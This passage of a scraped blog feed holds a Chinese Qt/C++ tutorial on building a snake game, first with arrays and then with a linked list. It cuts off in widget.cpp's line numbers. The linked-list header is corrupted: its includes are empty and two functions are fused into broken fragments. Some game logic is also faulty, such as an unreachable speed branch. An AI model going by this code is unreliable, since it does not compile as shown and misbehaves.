class="hljs-number">0</span>,<span class="hljs-number">100</span>,<span class="hljs-number">0</span>));<br>    &#125;<br>&#125;<br>Dialog::<span class="hljs-built_in">Dialog</span>(QWidget *parent) :<br>    <span class="hljs-built_in">QDialog</span>(parent),<br>    <span class="hljs-built_in">ui</span>(<span class="hljs-keyword">new</span> Ui::Dialog)<br>&#123;<br>    ui-&gt;<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br>    <span class="hljs-comment">//设置随机数</span><br>    QTime t=QTime::<span class="hljs-built_in">currentTime</span>();<br>    <span class="hljs-keyword">int</span> s=  t.<span class="hljs-built_in">secsTo</span>(<span class="hljs-built_in">QTime</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>));<br>     <span class="hljs-built_in">qsrand</span>(s);<br>    <span class="hljs-comment">//初始化</span><br>     <span class="hljs-built_in">initialized</span>();<br>    QPushButton *btnStart=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QPushButton</span>(<span class="hljs-keyword">this</span>);<br>    btnStart-&gt;<span class="hljs-built_in">setFlat</span>(<span class="hljs-literal">true</span>);<br>    btnStart-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;start ...&quot;</span>);<br>    btnStart-&gt;<span class="hljs-built_in">setGeometry</span>(<span class="hljs-number">500</span>,<span class="hljs-number">100</span>,<span class="hljs-number">250</span>,<span class="hljs-number">50</span>);<br>    QPushButton *btnPause=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QPushButton</span>(<span class="hljs-keyword">this</span>);<br>    btnPause-&gt;<span class="hljs-built_in">setFlat</span>(<span class="hljs-literal">true</span>);<br>    btnPause-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;pause ...&quot;</span>);<br>    btnPause-&gt;<span class="hljs-built_in">setGeometry</span>(<span class="hljs-number">500</span>,<span class="hljs-number">180</span>,<span class="hljs-number">250</span>,<span class="hljs-number">50</span>);<br>    <span class="hljs-built_in">connect</span>(btnStart,<span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">clicked</span>(<span class="hljs-keyword">bool</span>)),<span class="hljs-keyword">this</span>,<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">btnStartslot</span>()));<br>    <span class="hljs-built_in">connect</span>(btnPause,<span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">clicked</span>(<span class="hljs-keyword">bool</span>)),<span class="hljs-keyword">this</span>,<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">btnPauseslot</span>()));<br>    QLabel *lbshowScroe=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QLabel</span>(<span class="hljs-keyword">this</span>);<br>    lbScroe=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QLabel</span>(<span class="hljs-keyword">this</span>);<br>    lbshowScroe-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;得分：&quot;</span>);<br>    lbScroe-&gt;<span class="hljs-built_in">setText</span>(QString::<span class="hljs-built_in">number</span>(scores));<br>    lbshowScroe-&gt;<span class="hljs-built_in">setGeometry</span>(<span class="hljs-number">500</span>,<span class="hljs-number">50</span>,<span class="hljs-number">100</span>,<span class="hljs-number">50</span>);<br>    lbScroe-&gt;<span class="hljs-built_in">setGeometry</span>(<span class="hljs-number">600</span>,<span class="hljs-number">50</span>,<span class="hljs-number">100</span>,<span class="hljs-number">50</span>);<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">setFixedSize</span>(<span class="hljs-number">800</span>,<span class="hljs-number">460</span>);<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">setWindowTitle</span>(<span class="hljs-string">&quot;贪吃蛇&quot;</span>);<br>    <span class="hljs-comment">//设置时钟</span><br>    timer=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QTimer</span>(<span class="hljs-keyword">this</span>);<br>    timer-&gt;<span class="hljs-built_in">setInterval</span>(speed);<br>    <span class="hljs-built_in">connect</span>(timer,<span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">timeout</span>()),<span class="hljs-keyword">this</span>,<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">timeOut</span>()));<br>&#125;<br>Dialog::~<span class="hljs-built_in">Dialog</span>()<br>&#123;<br>    <span class="hljs-keyword">delete</span> ui;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Dialog::initialized</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    eatfoodCount=<span class="hljs-number">0</span>;<br>    scores=<span class="hljs-number">0</span>;<br>    speed=<span class="hljs-number">200</span>;<br>    <span class="hljs-comment">//初始化食物坐标</span><br>    food[<span class="hljs-number">0</span>]=<span class="hljs-built_in">qrand</span>()%Columns;<br>    food [<span class="hljs-number">1</span>]= <span class="hljs-built_in">qrand</span>()%Rows;<br>    <span class="hljs-comment">//初始化蛇头坐标</span><br>    snake[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-built_in">qrand</span>()%Columns;<br>    snake[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]=<span class="hljs-built_in">qrand</span>()%Rows;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; eatfoodCount; ++i) &#123;<br>        <span class="hljs-comment">//判断食物是否出现在蛇的身上</span><br>        <span class="hljs-keyword">if</span>(food[<span class="hljs-number">0</span>]==snake[i][<span class="hljs-number">0</span>]&amp;&amp;food[<span class="hljs-number">1</span>]==snake[i][<span class="hljs-number">1</span>])&#123;<br>            <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;the food position is at snake ...&quot;</span>;<br>            snake[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-built_in">qrand</span>()%Columns;<br>            snake[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]=<span class="hljs-built_in">qrand</span>()%Rows;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//初始化蛇头方向</span><br>    directtion=<span class="hljs-built_in">qrand</span>()%<span class="hljs-number">4</span>;<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Dialog::snakeRun</span><br><span class="hljs-comment">/// 蛇移动</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Dialog::snakeRun</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//打印出蛇的每个节点坐标，用于测试</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; eatfoodCount; ++i) &#123;<br>        <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-built_in">QString</span>(<span class="hljs-string">&quot;%1 : (%2-%3)&quot;</span>).<span class="hljs-built_in">arg</span>(i).<span class="hljs-built_in">arg</span>(snake[i][<span class="hljs-number">0</span>]).<span class="hljs-built_in">arg</span>(snake[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>    <span class="hljs-built_in">qDebug</span>()&lt;&lt;endl;<br>    <span class="hljs-comment">//吃到食物，即 食物 food x,y坐标 等于 蛇头snake[0] x，y坐标</span><br>    <span class="hljs-keyword">if</span>(snake[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]==food[<span class="hljs-number">0</span>]&amp;&amp;snake[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]==food[<span class="hljs-number">1</span>])&#123;<br>        scores+=<span class="hljs-number">20</span>; <span class="hljs-comment">//得分</span><br>        <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;eat the food&quot;</span>;<br>        eatfoodCount++;<span class="hljs-comment">//食物个数++</span><br>        lbScroe-&gt;<span class="hljs-built_in">setText</span>(QString::<span class="hljs-built_in">number</span>(scores));<br>        <span class="hljs-comment">//产生新的食物位置</span><br>        food[<span class="hljs-number">0</span>]=<span class="hljs-built_in">qrand</span>()%Columns;<br>        food [<span class="hljs-number">1</span>]= <span class="hljs-built_in">qrand</span>()%Rows;<br>    &#125;<br>    <span class="hljs-comment">//变换速度</span><br>    <span class="hljs-keyword">if</span>(scores&gt;= <span class="hljs-number">50</span>)&#123;<br>        speed=<span class="hljs-number">100</span>;<br>        timer-&gt;<span class="hljs-built_in">setInterval</span>(speed);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(scores&gt;=<span class="hljs-number">100</span>)&#123;<br>        speed=<span class="hljs-number">50</span>;<br>        timer-&gt;<span class="hljs-built_in">setInterval</span>(speed);<br>    &#125;<br>    <span class="hljs-built_in">checkHItWall</span>();<br>    <span class="hljs-built_in">checkEatSelf</span>();<br>    <span class="hljs-comment">//蛇头向前移动一格后，蛇头坐标变了，</span><br>    <span class="hljs-comment">//原蛇头的坐标为第一节身体的坐标，</span><br>    <span class="hljs-comment">//原第一节身体坐标为现在第二节的坐标，即所有坐标向前移动一格</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i =  eatfoodCount; i &gt;<span class="hljs-number">0</span>; i--) &#123;<br>        snake[i][<span class="hljs-number">0</span>]=snake[i<span class="hljs-number">-1</span>][<span class="hljs-number">0</span>];<br>        snake[i][<span class="hljs-number">1</span>]=snake[i<span class="hljs-number">-1</span>][<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-comment">//根据方向来移动蛇</span><br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (directtion) &#123;<br>    <span class="hljs-keyword">case</span> East:<br>        snake[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]--;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> South:<br>        snake[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]++;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> West:<br>        snake[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]++;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> North:<br>        snake[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]--;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">/// 更新绘图</span><br>    <span class="hljs-built_in">update</span>();<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Dialog::checkHItWall</span><br><span class="hljs-comment">/// 是否撞墙</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Dialog::checkHItWall</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//即 判断是否超过了边界</span><br>    <span class="hljs-keyword">if</span>((snake[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]&lt;<span class="hljs-number">0</span>||snake[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]&lt;<span class="hljs-number">0</span>||snake[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]&gt;Columns<span class="hljs-number">-1</span>||snake[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]&gt;Rows<span class="hljs-number">-1</span>))&#123;<br>       <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;Game Over&quot;</span>;<br>       timer-&gt;<span class="hljs-built_in">stop</span>();<br>       QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;game over&quot;</span>,<span class="hljs-string">&quot;hit the wall&quot;</span>);<br>       <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">close</span>();<br>    &#125;<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Dialog::checkEatSelf</span><br><span class="hljs-comment">/// 是否吃到自己</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Dialog::checkEatSelf</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//遍历每个蛇节点，判断蛇头 snake[0]  是否等于 某一个蛇身节点 snake[n]</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> n = <span class="hljs-number">1</span>; n &lt;= eatfoodCount; n++) &#123;<br>            <span class="hljs-keyword">if</span>(snake[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]==snake[n][<span class="hljs-number">0</span>]&amp;&amp;snake[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]==snake[n][<span class="hljs-number">1</span>])&#123;<br>                <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;Game Over;;;&quot;</span>;<br>                timer-&gt;<span class="hljs-built_in">stop</span>();<br>                QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;game over&quot;</span>,<span class="hljs-string">&quot;eat self&quot;</span>);<br>                <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">close</span>();<br>            &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>代码中的注释还算是比较详细的吧。。。不过关键还是自己亲手写出来！<br />
现在，来看一下运行结果<br />
<img src="/uploads/images/snake/snake1.gif" alt="img" /></p>
<p>那么，下次在介绍用链表实现贪吃蛇！</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt实现贪吃蛇2:链表实现</title>
    <url>/cpp-snake2/</url>
    <content><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
<p>前面已经介绍了用数组实现贪吃蛇，有了前面的基础知识，所以我就开门见山了。</p>
<span id="more"></span>
<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
<p>此文是在前面的数组实现基础上加以改进的，所以说大部分还是很相似的。不过链表还是和数组有一定的区别的，所以在看此文之前，要有一些关于c链表的的知识…而且对于新手来讲还是有一定难度的。。。那么开始吧</p>
<ul>
<li>首先，我先创建一个链表类（为什么我不能Qt自带的 <code>QLinkedList</code> ，因为用不习惯：(</li>
</ul>
<p><strong>linkedlist.h</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> LINKEDLIST_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LINKEDLIST_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Linkedlist</span>:</span>QObject<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//蛇节点</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SnakeNode</span>&#123;</span><br>        QPoint pos;<br>        SnakeNode* next;<br>        SnakeNode* prev;<br>    &#125;;<br>    <span class="hljs-built_in">Linkedlist</span>(QObject *parent=<span class="hljs-number">0</span>,QPoint headPos=<span class="hljs-built_in">QPoint</span>()):<br>        <span class="hljs-built_in">QObject</span>(parent),<span class="hljs-built_in">m_length</span>(<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">//初始化链表头，即蛇头</span><br>            m_head=<span class="hljs-keyword">new</span> SnakeNode;<br>            m_head-&gt;pos=headPos;<br>            m_head-&gt;next=<span class="hljs-literal">NULL</span>;<br>            m_head-&gt;prev=<span class="hljs-literal">NULL</span>;<br>    &#125;<br>    ~<span class="hljs-built_in">Linkedlist</span>()&#123;<br>            <span class="hljs-built_in">clearAllNodes</span>();<br>    &#125;<br>    <span class="hljs-comment">//返回头节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> SnakeNode *<span class="hljs-title">first</span><span class="hljs-params">()</span><span class="hljs-keyword">const</span></span>&#123;<span class="hljs-keyword">if</span>(m_head)&#123;<span class="hljs-keyword">return</span> m_head;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;<br>    <span class="hljs-comment">//返回尾节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> SnakeNode *<span class="hljs-title">last</span><span class="hljs-params">()</span><span class="hljs-keyword">const</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(m_head)&#123;<br>            SnakeNode *p1=m_head;<br>            SnakeNode *p2;<br>            <span class="hljs-keyword">do</span> &#123;<br>                p2=p1;<br>                p1=p1-&gt;next;<br>            &#125; <span class="hljs-keyword">while</span> (p1);<br>            <span class="hljs-keyword">return</span> p2;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//返回节点总数</span><br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getLength</span><span class="hljs-params">()</span></span>&#123;<br>         m_length=<span class="hljs-number">0</span>;<br>         <span class="hljs-keyword">if</span>(m_head)&#123;<br>             SnakeNode *p=m_head;<br>             <span class="hljs-keyword">do</span> &#123;<br>                 m_length+=<span class="hljs-number">1</span>;<br>                 p=p-&gt;next;<br>             &#125; <span class="hljs-keyword">while</span> (p!=<span class="hljs-literal">NULL</span>);<br>         &#125;<br>         <span class="hljs-keyword">return</span> m_length;<br>    &#125;<br>    <span class="hljs-comment">//打印所以节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printLinkedlist</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(m_head )&#123;<br>            SnakeNode *p=m_head;<br>            <span class="hljs-keyword">do</span> &#123;<br>                <span class="hljs-built_in">qDebug</span>()&lt;pos;<br>                p=p-&gt;next;<br>            &#125; <span class="hljs-keyword">while</span> (p);<br>            <span class="hljs-built_in">qDebug</span>()&lt;<span class="hljs-built_in">last</span>())&#123;<br>          SnakeNode *ls=<span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">last</span>();<br>          <span class="hljs-keyword">if</span>(ls)&#123;<br>              SnakeNode *p2=<span class="hljs-keyword">new</span> SnakeNode;<br>              p2-&gt;prev=ls;<br>              p2-&gt;next=<span class="hljs-literal">NULL</span>;<br>              p2-&gt;pos=pos;<br><br>              ls-&gt;next=p2;<br>          &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-comment">//释放所有节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">clearAllNodes</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(m_head)&#123;<br>            SnakeNode *p=m_head;<br>            <span class="hljs-keyword">do</span> &#123;<br>                SnakeNode*t=p;<br>                m_head=p-&gt;next;<br>                <span class="hljs-keyword">delete</span> t;<br>                t=<span class="hljs-literal">NULL</span>;<br>                p=m_head;<br>            &#125; <span class="hljs-keyword">while</span> (p);<br>        &#125;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">int</span> m_length;<br>    SnakeNode *m_head;<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// LINKEDLIST_H</span></span><br><br></code></pre></div></td></tr></table></figure>
<p>这里就不多说了。。。不过要注意这里的</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//蛇节点</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SnakeNode</span>&#123;</span><br>    QPoint pos;<br>    SnakeNode* next;<br>    SnakeNode* prev;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<p>原本是没有 <code>SnakeNode* prev;</code> 的，后来在写代码时遇到点棘手的问题，所以就该了一下，变成双向链表。不过这里没有太在意这些，而且关于链表的操作也很少</p>
<p><strong>widget.h</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> WIDGET_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WIDGET_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;QWidget&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QLinkedList&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QTimer&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QKeyEvent&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;linkedlist.h&quot;</span></span><br><span class="hljs-keyword">namespace</span> Ui &#123;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span>;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QLineEdit</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> :</span> <span class="hljs-keyword">public</span> QWidget<br>&#123;<br>    Q_OBJECT<br><span class="hljs-keyword">protected</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">keyPressEvent</span><span class="hljs-params">(QKeyEvent *event)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">paintEvent</span><span class="hljs-params">(QPaintEvent *event)</span></span>;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//蛇头移动方向</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">SnakeDirection</span>:</span><span class="hljs-keyword">int</span>&#123;<br>        Up,<br>        Down,<br>        Left,<br>        Right<br>    &#125;;<br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Widget</span><span class="hljs-params">(QWidget *parent = <span class="hljs-number">0</span>)</span></span>;<br>    ~<span class="hljs-built_in">Widget</span>();<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initializedGUI</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">resetFoodPos</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">checkisEatSelf</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">checkisEatFood</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">checkisHitWall</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">checkFoodPosisEqualHeadPos</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">snakeRunning</span><span class="hljs-params">()</span></span>;<br><span class="hljs-keyword">public</span> slots:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">timeOut</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">startGame</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">stopGame</span><span class="hljs-params">()</span></span>;<br><span class="hljs-keyword">private</span>:<br>    Linkedlist *linkedlist;  <span class="hljs-comment">//蛇链表</span><br>    <span class="hljs-keyword">int</span> m_eatfoodCount; <span class="hljs-comment">//吃到食物总数</span><br>    QPoint m_foodPos;<span class="hljs-comment">//食物坐标</span><br>    <span class="hljs-keyword">int</span> m_direction;<span class="hljs-comment">//蛇头方向</span><br>    <span class="hljs-keyword">int</span> m_speed;<span class="hljs-comment">//蛇移动速度</span><br>    <span class="hljs-keyword">int</span> m_score ;<span class="hljs-comment">//得分</span><br>    QPoint m_tmpPosPrev;<br>    QTimer *m_timerControl;<br>    QLineEdit *leScore;<br>    Ui::Widget *ui;<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// WIDGET_H</span></span><br></code></pre></div></td></tr></table></figure>
<p><strong>widget.cpp</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 